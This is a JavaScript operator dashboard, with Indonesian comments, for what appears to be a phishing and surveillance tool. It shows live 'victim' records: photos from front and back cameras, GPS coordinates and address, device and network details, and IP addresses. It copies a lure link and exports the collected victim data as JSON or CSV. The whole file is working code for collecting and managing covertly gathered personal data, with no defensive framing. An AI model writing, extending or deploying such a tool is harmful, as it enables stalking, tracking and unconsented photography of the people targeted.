// Script JS Dashboard HTML
// Konfigurasi socket dengan retry
const socket = io({
  reconnection: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 1000,
  timeout: 10000,
});

let victims = [];
let photos = {}; // Sekarang photos[victimId] = array of {image, cameraType, timestamp}
let currentFilter = "all";
let searchTerm = "";

// Status koneksi
socket.on("connect", () => {
  console.log("✅ Terhubung ke server");
  const statusEl = document.getElementById("connection-status");
  if (statusEl) {
    statusEl.innerHTML = "🟢 Terhubung";
    statusEl.style.color = "#00ff9d";
  }
});

socket.on("disconnect", () => {
  console.log("❌ Terputus dari server");
  const statusEl = document.getElementById("connection-status");
  if (statusEl) {
    statusEl.innerHTML = "🔴 Terputus";
    statusEl.style.color = "#ff4444";
  }
});

socket.on("connect_error", (error) => {
  console.log("Connection error:", error);
  const statusEl = document.getElementById("connection-status");
  if (statusEl) {
    statusEl.innerHTML = "🟡 Error";
    statusEl.style.color = "#ffaa00";
  }
});

// Update stats dengan validasi data
function updateStats() {
  const filteredVictims = filterVictimsData(victims);

  document.getElementById("totalVictims").textContent = filteredVictims.length;

  const cameraGranted = filteredVictims.filter((v) => {
    return (
      v.data &&
      v.data.camera_access &&
      v.data.camera_access.status === "granted"
    );
  }).length;

  const locationGranted = filteredVictims.filter((v) => {
    return v.data && v.data.location && v.data.location.status === "granted";
  }).length;

  document.getElementById("cameraCount").textContent = cameraGranted;
  document.getElementById("locationCount").textContent = locationGranted;

  // Active in last 5 minutes
  const fiveMinAgo = Date.now() - 5 * 60 * 1000;
  const activeNow = filteredVictims.filter((v) => {
    const timestamp = v.timestamp ? new Date(v.timestamp).getTime() : 0;
    return timestamp > fiveMinAgo;
  }).length;

  document.getElementById("activeNow").textContent = activeNow;
}

// Filter data berdasarkan kriteria
function filterVictimsData(data) {
  let filtered = [...data];

  // Filter berdasarkan pencarian
  if (searchTerm) {
    filtered = filtered.filter((v) => {
      const searchLower = searchTerm.toLowerCase();
      return (
        (v.victimId && v.victimId.toLowerCase().includes(searchLower)) ||
        (v.ip && v.ip.includes(searchTerm)) ||
        (v.data && v.data.public_ip && v.data.public_ip.includes(searchTerm))
      );
    });
  }

  // Filter berdasarkan kategori
  switch (currentFilter) {
    case "camera":
      filtered = filtered.filter(
        (v) =>
          v.data &&
          v.data.camera_access &&
          v.data.camera_access.status === "granted",
      );
      break;
    case "location":
      filtered = filtered.filter(
        (v) =>
          v.data && v.data.location && v.data.location.status === "granted",
      );
      break;
    case "today":
      const today = new Date().toDateString();
      filtered = filtered.filter((v) => {
        return v.timestamp && new Date(v.timestamp).toDateString() === today;
      });
      break;
  }

  return filtered;
}

// ============= FUNGSI RENDER FOTO UNTUK MULTIPLE CAMERA =============

// Fungsi untuk render foto (support multiple camera)
function renderPhotos(victimId, cameraStatus) {
  const victimPhotos = photos[victimId];

  // Jika tidak ada foto sama sekali
  if (
    !victimPhotos ||
    !Array.isArray(victimPhotos) ||
    victimPhotos.length === 0
  ) {
    return cameraStatus === "granted" ? "Mengambil foto..." : "Tidak ada foto";
  }

  // Ambil 5 foto terakhir
  const recentPhotos = victimPhotos.slice(-5).reverse();

  // Kelompokkan berdasarkan tipe kamera
  const frontPhotos = victimPhotos.filter((p) => p.cameraType === "front");
  const backPhotos = victimPhotos.filter((p) => p.cameraType === "back");
  const otherPhotos = victimPhotos.filter(
    (p) => p.cameraType !== "front" && p.cameraType !== "back",
  );

  let html = "";

  // Tampilkan foto dengan label kamera yang jelas
  if (frontPhotos.length > 0) {
    const lastFront = frontPhotos[frontPhotos.length - 1];
    html += `
            <div style="border-left: 3px solid #00ff9d; padding-left: 10px; margin-bottom: 15px;">
                <div style="font-size: 11px; margin-bottom: 5px; color: #00ff9d;">📱 KAMERA DEPAN</div>
                <img src="${lastFront.image}" class="photo-preview" 
                     onclick="showPhotoWithType('${victimId}', 'front')"
                     style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
                <div style="font-size: 10px; color: #888; margin-top: 3px;">
                    ${new Date(lastFront.timestamp).toLocaleTimeString()}
                    ${frontPhotos.length > 1 ? ` | Total: ${frontPhotos.length} foto` : ""}
                </div>
            </div>
        `;
  }

  // Tampilkan foto kamera belakang
  if (backPhotos.length > 0) {
    const lastBack = backPhotos[backPhotos.length - 1];
    html += `
            <div style="border-left: 3px solid #ff4444; padding-left: 10px; margin-bottom: 15px;">
                <div style="font-size: 11px; margin-bottom: 5px; color: #ff8888;">📱 KAMERA BELAKANG</div>
                <img src="${lastBack.image}" class="photo-preview" 
                     onclick="showPhotoWithType('${victimId}', 'back')"
                     style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
                <div style="font-size: 10px; color: #888; margin-top: 3px;">
                    ${new Date(lastBack.timestamp).toLocaleTimeString()}
                    ${backPhotos.length > 1 ? ` | Total: ${backPhotos.length} foto` : ""}
                </div>
            </div>
        `;
  }

  // Tampilkan foto lain (fallback, default, dll)
  if (
    otherPhotos.length > 0 &&
    frontPhotos.length === 0 &&
    backPhotos.length === 0
  ) {
    const lastOther = otherPhotos[otherPhotos.length - 1];
    let cameraLabel = "";
    if (lastOther.cameraType === "single") cameraLabel = "📷 KAMERA";
    else if (lastOther.cameraType === "fallback") cameraLabel = "🔄 FALLBACK";
    else cameraLabel = "📸 FOTO";

    html += `
            <div style="border-left: 3px solid #ffaa00; padding-left: 10px;">
                <div style="font-size: 11px; margin-bottom: 5px; color: #ffaa00;">${cameraLabel}</div>
                <img src="${lastOther.image}" class="photo-preview" 
                     onclick="showPhotoWithType('${victimId}', '${lastOther.cameraType}')"
                     style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
                <div style="font-size: 10px; color: #888; margin-top: 3px;">
                    ${new Date(lastOther.timestamp).toLocaleTimeString()}
                </div>
            </div>
        `;
  }

  // Tampilkan total foto
  if (victimPhotos.length > 5) {
    html += `<div style="font-size: 10px; color: #888; text-align: center; margin-top: 5px;">+ ${victimPhotos.length - 5} foto lainnya</div>`;
  }

  return html;
}

// Fungsi showPhoto dengan dukungan tipe kamera
function showPhotoWithType(victimId, cameraType) {
  const victimPhotos = photos[victimId];
  if (!victimPhotos || !Array.isArray(victimPhotos)) return;

  let photoToShow = null;

  // Cari foto dengan cameraType tertentu
  if (cameraType) {
    const filtered = victimPhotos.filter((p) => p.cameraType === cameraType);
    if (filtered.length > 0) {
      photoToShow = filtered[filtered.length - 1];
    }
  }

  // Jika tidak ditemukan, ambil foto terbaru
  if (!photoToShow && victimPhotos.length > 0) {
    photoToShow = victimPhotos[victimPhotos.length - 1];
  }

  if (photoToShow) {
    const modal = document.getElementById("photoModal");
    const modalImg = document.getElementById("modalImage");
    const modalCaption = document.getElementById("modalCaption");

    if (modal && modalImg) {
      modal.style.display = "block";
      modalImg.src = photoToShow.image;

      if (modalCaption) {
        let caption = "";
        switch (photoToShow.cameraType) {
          case "front":
            caption = "📱 Kamera Depan";
            break;
          case "back":
            caption = "📱 Kamera Belakang";
            break;
          case "single":
            caption = "📷 Kamera";
            break;
          case "fallback":
            caption = "🔄 Fallback Camera";
            break;
          default:
            caption = "📸 Foto";
        }
        caption += ` - ${new Date(photoToShow.timestamp).toLocaleString()}`;
        modalCaption.textContent = caption;
      }
    }
  }
}

// Fungsi showPhoto original (backward compatibility)
function showPhoto(victimId) {
  showPhotoWithType(victimId, null);
}

// ============= RENDER VICTIM CARD =============

function renderVictim(victim) {
  if (!victim || !victim.victimId) return null;

  const card = document.createElement("div");
  card.className = "victim-card";
  card.id = `victim-${victim.victimId}`;

  // Data dengan fallback
  const data = victim.data || {};
  const deviceInfo = data.device_info || {};
  const location = data.location || {};
  const camera = data.camera_access || {};
  const network = data.network || {};

  // Format data dengan aman
  const userAgent = deviceInfo.userAgent || "Tidak tersedia";
  const platform = deviceInfo.platform || "Tidak tersedia";
  const screenInfo =
    deviceInfo.screenWidth && deviceInfo.screenHeight
      ? `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`
      : "Tidak tersedia";
  const batteryInfo = deviceInfo.battery || "Tidak tersedia";
  const ipPublic = data.public_ip || "Tidak tersedia";
  const ipLokal = victim.ip || "Tidak tersedia";

  // Format timestamp
  const timestamp = victim.timestamp ? new Date(victim.timestamp) : new Date();
  const timeStr = timestamp.toLocaleTimeString();
  const dateStr = timestamp.toLocaleDateString();

  // Status badges
  const hasCamera =
    camera.status === "granted"
      ? '<span class="badge badge-success">📸 Camera OK</span>'
      : "";
  const hasLocation =
    location.status === "granted"
      ? '<span class="badge badge-success">📍 Location OK</span>'
      : "";

  // Render foto dengan fungsi baru
  const photosHtml = renderPhotos(victim.victimId, camera.status);

  card.innerHTML = `
        <div class="victim-header">
            <div>
                <span class="victim-id">${victim.victimId}</span>
                ${hasCamera}
                ${hasLocation}
            </div>
            <span class="timestamp">${dateStr} ${timeStr}</span>
        </div>
        
        <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
            <span>
                <span class="camera-indicator ${camera.status === "granted" ? "camera-active" : ""}"></span> 
                Camera: ${camera.status || "Belum diminta"}
            </span>
            <span>
                <span class="camera-indicator ${location.status === "granted" ? "location-active" : ""}"></span> 
                Location: ${location.status || "Belum diminta"}
            </span>
        </div>
        
        ${
          location.status === "granted" && location.latitude
            ? `
        <div class="data-section">
            <div class="data-title">📍 LOKASI GPS</div>
            <div class="data-content">
                <div class="info-row-dot">
                    <div class="info-label-dot">Latitude</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${location.latitude}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Longitude</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${location.longitude}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Akurasi</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${location.accuracy || "N/A"} meter</div>
                </div>
                ${
                  location.altitude
                    ? `
                <div class="info-row-dot">
                    <div class="info-label-dot">Altitude</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${location.altitude} meter</div>
                </div>
                `
                    : ""
                }
                <div class="info-row-dot">
                    <div class="info-label-dot">Maps</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">
                        <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" 
                           target="_blank" class="map-link">🔍 Buka di Google Maps</a>
                    </div>
                </div>
            </div>
        </div>
        `
            : ""
        }
        
        ${
          data.location_address
            ? `
        <div class="data-section">
            <div class="data-title">🏠 ALAMAT</div>
            <div class="data-content">
                ${data.location_address}
            </div>
        </div>
        `
            : ""
        }
        
        <div class="data-section">
            <div class="data-title">📱 INFO DEVICE</div>
            <div class="data-content">
                <div class="info-row-dot">
                    <div class="info-label-dot">Platform</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${platform}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Browser</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${userAgent.length > 60 ? userAgent.substring(0, 60) + "..." : userAgent}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Screen</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${screenInfo}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Battery</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${batteryInfo}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Language</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${deviceInfo.language || "N/A"}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Timezone</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${deviceInfo.timezone || "N/A"}</div>
                </div>
            </div>
        </div>
        
        <div class="data-section" id="photo-${victim.victimId}">
            <div class="data-title">📸 FOTO KAMERA</div>
            <div class="data-content" id="photo-content-${victim.victimId}">
                ${photosHtml}
            </div>
        </div>
        
        <div class="data-section">
            <div class="data-title">🌐 NETWORK</div>
            <div class="data-content">
                <div class="info-row-dot">
                    <div class="info-label-dot">Online</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${network.online ? "Ya" : "Tidak"}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Koneksi</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${network.connection?.type || "N/A"}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">Kecepatan</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${network.connection?.downlink || "N/A"} Mbps</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">IP Public</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${ipPublic}</div>
                </div>
                <div class="info-row-dot">
                    <div class="info-label-dot">IP Lokal</div>
                    <div class="info-colon">:</div>
                    <div class="info-value-dot">${ipLokal}</div>
                </div>
            </div>
        </div>
        
        <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
            ID: ${victim.victimId}
        </div>
    `;

  return card;
}

// Update all victims dengan filter
function updateVictimsList() {
  const grid = document.getElementById("victimGrid");

  if (!victims || victims.length === 0) {
    grid.innerHTML = '<div class="loading">Belum ada data korban...</div>';
    updateStats();
    return;
  }

  // Sort by timestamp descending
  const sortedVictims = [...victims].sort((a, b) => {
    const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
    const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
    return timeB - timeA;
  });

  // Apply filters
  const filteredVictims = filterVictimsData(sortedVictims);

  if (filteredVictims.length === 0) {
    grid.innerHTML =
      '<div class="loading">Tidak ada data dengan filter ini</div>';
    updateStats();
    return;
  }

  grid.innerHTML = "";
  filteredVictims.forEach((victim) => {
    const card = renderVictim(victim);
    if (card) grid.appendChild(card);
  });

  updateStats();
}

// ============= SOCKET EVENT HANDLERS =============

// Handle new victim data
socket.on("new-victim", (data) => {
  console.log("📥 New victim data:", data);

  if (!data || !data.victimId) {
    console.warn("Invalid victim data:", data);
    return;
  }

  const existingIndex = victims.findIndex(
    (v) => v && v.victimId === data.victimId,
  );

  if (existingIndex >= 0) {
    if (!victims[existingIndex].data) {
      victims[existingIndex].data = {};
    }

    if (data.type && data.data) {
      victims[existingIndex].data[data.type] = data.data;
    } else if (data.data) {
      victims[existingIndex].data = {
        ...victims[existingIndex].data,
        ...data.data,
      };
    }

    if (data.timestamp) victims[existingIndex].timestamp = data.timestamp;
    if (data.ip) victims[existingIndex].ip = data.ip;
  } else {
    const newVictim = {
      victimId: data.victimId,
      timestamp: data.timestamp || new Date().toISOString(),
      ip: data.ip || "Unknown",
      data: {},
    };

    if (data.type && data.data) {
      newVictim.data[data.type] = data.data;
    } else if (data.data) {
      newVictim.data = data.data;
    }

    victims.push(newVictim);
  }

  // Hapus duplikat
  const uniqueVictims = [];
  const seen = new Set();
  victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  victims.forEach((v) => {
    if (!seen.has(v.victimId)) {
      seen.add(v.victimId);
      uniqueVictims.push(v);
    }
  });
  victims = uniqueVictims;

  updateVictimsList();
});

// Handle initial data
socket.on("init-data", (initialData) => {
  console.log("📊 Initial data received:", initialData);

  if (Array.isArray(initialData)) {
    victims = initialData
      .filter((v) => v && v.victimId)
      .map((v) => {
        if (!v.data) v.data = {};
        return v;
      });

    const unique = [];
    const seen = new Set();
    victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    victims.forEach((v) => {
      if (!seen.has(v.victimId)) {
        seen.add(v.victimId);
        unique.push(v);
      }
    });
    victims = unique;
  }

  updateVictimsList();
});

// Handle new photo (MULTIPLE CAMERA SUPPORT)
socket.on("new-photo", (data) => {
  console.log("📸 New photo received:", data.victimId, data.cameraType);

  if (data && data.victimId && data.image) {
    // Inisialisasi array jika belum ada
    if (!photos[data.victimId]) {
      photos[data.victimId] = [];
    }

    // Tambahkan foto baru ke array
    const photoData = {
      image: data.image,
      cameraType: data.cameraType || "unknown",
      timestamp: data.timestamp || new Date().toISOString(),
    };

    photos[data.victimId].push(photoData);

    // Batasi maksimal 20 foto per victim
    if (photos[data.victimId].length > 20) {
      photos[data.victimId] = photos[data.victimId].slice(-20);
    }

    // Update tampilan di card
    const victim = victims.find((v) => v.victimId === data.victimId);
    const cameraStatus = victim?.data?.camera_access?.status || "";
    const newPhotosHtml = renderPhotos(data.victimId, cameraStatus);

    const photoContainer = document.getElementById(
      `photo-content-${data.victimId}`,
    );
    if (photoContainer) {
      photoContainer.innerHTML = newPhotosHtml;
    } else {
      // Jika container belum ada, refresh list
      updateVictimsList();
    }

    console.log(
      `📊 Total photos for ${data.victimId}: ${photos[data.victimId].length}`,
    );
  }
});

// ============= UTILITY FUNCTIONS =============

function copyLink() {
  const link = window.location.origin + "/demo";
  navigator.clipboard
    .writeText(link)
    .then(() => {
      alert("✅ Link demo copied: " + link);
    })
    .catch(() => {
      prompt("📋 Copy link ini:", link);
    });
}

function exportData() {
  const exportData = {
    victims: victims,
    photos: photos,
    exportTime: new Date().toISOString(),
  };
  const dataStr = JSON.stringify(exportData, null, 2);
  const blob = new Blob([dataStr], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `export_${new Date().toISOString().slice(0, 19).replace(/:/g, "-")}.json`;
  a.click();
  URL.revokeObjectURL(url);
}

function exportCSV() {
  let csv =
    "Victim ID,Timestamp,IP,Camera,Location,Latitude,Longitude,Photos Count,Browser,Platform\n";

  victims.forEach((v) => {
    const photoCount = photos[v.victimId] ? photos[v.victimId].length : 0;
    const row = [
      v.victimId || "",
      v.timestamp || "",
      v.ip || "",
      v.data?.camera_access?.status || "",
      v.data?.location?.status || "",
      v.data?.location?.latitude || "",
      v.data?.location?.longitude || "",
      photoCount,
      (v.data?.device_info?.userAgent || "")
        .replace(/,/g, " ")
        .substring(0, 100),
      v.data?.device_info?.platform || "",
    ]
      .map((cell) => `"${cell}"`)
      .join(",");

    csv += row + "\n";
  });

  const blob = new Blob([csv], { type: "text/csv" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `victims_${Date.now()}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

function clearData() {
  if (confirm("⚠️ Hapus semua data victim? Data tidak bisa dikembalikan!")) {
    victims = [];
    photos = {};
    updateVictimsList();

    fetch("/api/clear-data", { method: "POST" }).catch(() => {});
  }
}

function refreshData() {
  socket.emit("request-refresh");
  updateVictimsList();
}

function filterVictims() {
  const input = document.getElementById("searchInput");
  if (input) {
    searchTerm = input.value.toLowerCase();
  }
  updateVictimsList();
}

function setFilter(filter) {
  currentFilter = filter;

  document.querySelectorAll(".filter-btn").forEach((btn) => {
    btn.classList.remove("active");
  });
  if (event && event.target) {
    event.target.classList.add("active");
  }

  updateVictimsList();
}

// Modal functions
function closeModal() {
  const modal = document.getElementById("photoModal");
  if (modal) modal.style.display = "none";
}

// Click outside modal to close
window.onclick = function (event) {
  const modal = document.getElementById("photoModal");
  if (event.target == modal) {
    modal.style.display = "none";
  }
};

// Keyboard shortcut
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    closeModal();
  }
});

// Periodic refresh
setInterval(() => {
  socket.emit("ping");
}, 30000);

console.log("✅ Dashboard siap dengan dukungan multiple camera!");
